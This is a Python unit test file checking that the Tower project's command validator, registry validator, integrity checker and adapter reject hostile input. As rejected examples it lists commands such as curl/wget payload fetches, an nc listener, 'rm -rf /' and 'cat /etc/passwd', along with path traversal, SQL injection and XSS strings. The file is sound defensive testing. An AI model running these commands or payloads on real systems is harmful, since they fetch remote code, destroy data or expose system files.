"""Comprehensive adversarial and bounds testing for Tower subsystems."""
from __future__ import annotations

import copy
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT))

from integrations.megamind.adapter import TechnologyRequest, select_technologies
from tower import build, integrity
from tower.capability_resolution import (
    BoundaryObjective,
    LanguageLane,
    TechnologyCandidate,
    resolve_lanes,
    resolve_technology,
)
from tower.integrity import (
    _eligible,
    _invalid_snapshot,
    _load_delta,
    _verify_snapshot,
    collect_hashes,
    write_manifest,
)
from tower.registry import TowerRegistry, load_registry, validate_registry


class AdversarialSecurityAndBoundsTests(unittest.TestCase):
    """Adversarial survival and boundary integrity tests."""

    def setUp(self) -> None:
        self.registry = load_registry()

    def test_adversarial_command_policy_rejects_arbitrary_shell_and_injections(self) -> None:
        """Command validator strictly rejects subshells, pipes, metacharacters, and unapproved tools."""
        forbidden_commands = [
            ["bash", "-c", "echo pwned"],
            ["sh", "-c", "whoami"],
            ["zsh", "-lc", "cat /etc/passwd"],
            ["curl", "https://malicious.invalid/payload.sh"],
            ["wget", "https://malicious.invalid/payload.sh"],
            ["nc", "-lvnp", "4444"],
            ["rm", "-rf", "/"],
            ["../outside-tool/bin/run"],
            ["/bin/bash"],
            ["/usr/bin/python3"],
            ["eval", "echo 1"],
            ["sudo", "su"],
        ]
        for cmd in forbidden_commands:
            with self.subTest(cmd=cmd):
                violation = build._validate_argv(cmd)
                self.assertIsNotNone(
                    violation,
                    f"Expected command policy to reject {cmd}, but got None",
                )

    def test_adversarial_registry_validation_rejects_malformed_entries(self) -> None:
        """Registry validator catches tampered, malformed, or hostile technology entries."""
        valid_payload = copy.deepcopy(self.registry.payload)
        source = Path("registry/tower.yml")

        # 1. Non-dict technology
        bad_payload = copy.deepcopy(valid_payload)
        bad_payload["technologies"].append("invalid-non-dict-entry")
        reg = TowerRegistry(bad_payload, source=source, source_files=(source,))
        errors = validate_registry(reg)
        self.assertTrue(any("must be an object" in err for err in errors))

        # 2. Path traversal in example paths
        bad_payload = copy.deepcopy(valid_payload)
        bad_payload["technologies"].append({
            "id": "traversal-attack",
            "name": "Traversal Attack",
            "category": "exploit",
            "artifact_type": "exploit",
            "what": "what", "where": "where", "when": "when", "why": "why", "how": "how",
            "easy_example": "../../etc/passwd",
            "advanced_example": "../../../secret.key",
            "evidence_state": "illustrative",
            "proof_class": "illustrative",
            "toolchain": {"tool": "python", "reference_pin": "3.12", "build": [], "test": []},
            "execution": {"hardware_gate": "", "ci_tier": "portable"},
            "primary_evidence": ["https://example.invalid"],
        })
        reg = TowerRegistry(bad_payload, source=source, source_files=(source,))
        errors = validate_registry(reg)
        self.assertTrue(any("escapes" in err or "must be relative" in err or "missing" in err for err in errors))

        # 3. Invalid evidence_state and proof_class
        bad_payload = copy.deepcopy(valid_payload)
        bad_payload["technologies"].append({
            "id": "invalid-evidence-tier",
            "name": "Invalid Tier",
            "extension": "py",
            "category": "exploit",
            "artifact_type": "exploit",
            "what": "substantive what string here",
            "where": "substantive where string here",
            "when": "substantive when string here",
            "why": "substantive why string here",
            "how": "substantive how string here",
            "easy_example": "languages/python/easy_fibonacci.py",
            "advanced_example": "languages/python/advanced_async_orchestrator.py",
            "evidence_state": "root_shell_granted",
            "proof_class": "root_shell_granted",
            "toolchain": {"tool": "python", "reference_pin": "3.12", "build": [], "test": []},
            "execution": {"hardware_gate": "", "ci_tier": "portable"},
            "interfaces": [],
            "megamind": {"agents": [], "pistons": []},
            "primary_evidence": ["https://example.invalid"],
        })
        reg = TowerRegistry(bad_payload, source=source, source_files=(source,))
        errors = validate_registry(reg)
        self.assertTrue(any("is not governed" in err for err in errors))

    def test_adversarial_integrity_snapshot_tamper_resistance(self) -> None:
        """Integrity verifier flags any tampered digest, length, or structural forgery."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir) / "snapshot.json"
            snapshot = write_manifest(temp_path)

            # Corrupted digest format (non-hex, wrong length)
            snapshot["hashes"]["AGENTS.md"] = "not-a-valid-sha256-digest"
            temp_path.write_text(json.dumps(snapshot), encoding="utf-8")
            result = _verify_snapshot(temp_path)
            self.assertFalse(result["ok"])
            self.assertEqual(result["status"], "INVALID_SNAPSHOT")

            # File count spoofing
            snapshot["hashes"]["AGENTS.md"] = "0" * 64
            snapshot["file_count"] = 999999
            temp_path.write_text(json.dumps(snapshot), encoding="utf-8")
            result = _verify_snapshot(temp_path)
            self.assertFalse(result["ok"])
            self.assertEqual(result["status"], "INVALID_SNAPSHOT")

    def test_adversarial_integrity_delta_tamper_rejection(self) -> None:
        """Delta loader strictly rejects unbound or corrupt delta records."""
        with tempfile.TemporaryDirectory() as temp_dir:
            delta_file = Path(temp_dir) / "delta.json"

            # Bad schema
            delta_file.write_text(json.dumps({"schema": "corrupt.schema"}), encoding="utf-8")
            with self.assertRaises(ValueError):
                _load_delta(delta_file, base_manifest_sha256="abc", expected_hashes={})

            # Base digest mismatch
            delta_file.write_text(
                json.dumps({
                    "schema": "glaciereq.integrity-delta.v1",
                    "base_manifest_sha256": "wrong-sha",
                    "changes": {},
                    "removals": [],
                    "resulting_file_count": 0,
                }),
                encoding="utf-8",
            )
            with self.assertRaises(ValueError):
                _load_delta(delta_file, base_manifest_sha256="expected-sha", expected_hashes={})

    def test_adversarial_megamind_adapter_resilience(self) -> None:
        """Technology adapter rejects invalid mission IDs and unknown proof classes."""
        # Empty mission ID
        with self.assertRaises(ValueError):
            select_technologies(TechnologyRequest(mission_id="", capabilities=("coding",)))

        # Whitespace-only mission ID
        with self.assertRaises(ValueError):
            select_technologies(TechnologyRequest(mission_id="   ", capabilities=("coding",)))

        # Invalid proof class
        with self.assertRaises(ValueError):
            select_technologies(
                TechnologyRequest(
                    mission_id="mission-1",
                    capabilities=("coding",),
                    minimum_proof_class="super_root",
                )
            )

        # Non-matching adversarial capability strings do not crash
        result = select_technologies(
            TechnologyRequest(
                mission_id="adversarial-test",
                capabilities=("'; DROP TABLE technologies; --", "<script>alert(1)</script>"),
            )
        )
        self.assertEqual(result["mission_id"], "adversarial-test")
        self.assertEqual(result["technology_ids"], [])
        self.assertEqual(len(result["unmatched_capabilities"]), 2)

    def test_adversarial_capability_lane_bounds(self) -> None:
        """LanguageLane reports observations when fields are stubbed or too short."""
        stub_lane = LanguageLane(
            lane_id="",
            concern="",
            language="",
            rationale="short",
            interface="",
            proof="",
        )
        observations = stub_lane.observations()
        self.assertIn("lane_id_needs_detail", observations)
        self.assertIn("concern_needs_detail", observations)
        self.assertIn("language_needs_detail", observations)
        self.assertIn("interface_needs_detail", observations)
        self.assertIn("proof_needs_detail", observations)
        self.assertIn("rationale_needs_boundary_fitness_detail", observations)


if __name__ == "__main__":
    unittest.main()